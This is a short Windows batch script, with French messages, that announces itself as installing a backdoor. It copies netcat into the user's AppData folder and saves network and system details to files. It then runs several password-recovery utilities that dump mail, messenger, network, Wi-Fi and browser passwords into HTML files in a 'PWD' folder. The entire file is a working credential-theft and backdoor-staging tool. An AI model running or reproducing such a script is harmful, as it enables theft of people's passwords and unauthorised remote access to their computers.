@echo off
color 2
cls
echo Installation de la Backdoor en cours...
xcopy \prive\r\nc.exe "%appdata%" /Y
ipconfig/flushdns
ipconfig>\prive\r\PWD\ConfIp.txt
systeminfo>\prive\r\PWD\SysInfos.txt
cls
start \prive\r\for.bat
start \prive\r\phazess\mailpv.exe /shtml \prive\r\PWD\mailpv.html 
start \prive\r\phazess\mspass.exe /shtml \prive\r\PWD\mspass.html
start \prive\r\phazess\netpass.exe /shtml \prive\r\PWD\netpass.html
start \prive\r\phazess\WirelessKeyView.exe /shtml \prive\r\PWD\WirelessKeyView.html
start \prive\r\phazess\WebBrowserPassView.exe /shtml \prive\r\PWD\WebBrowserPassView.html
exit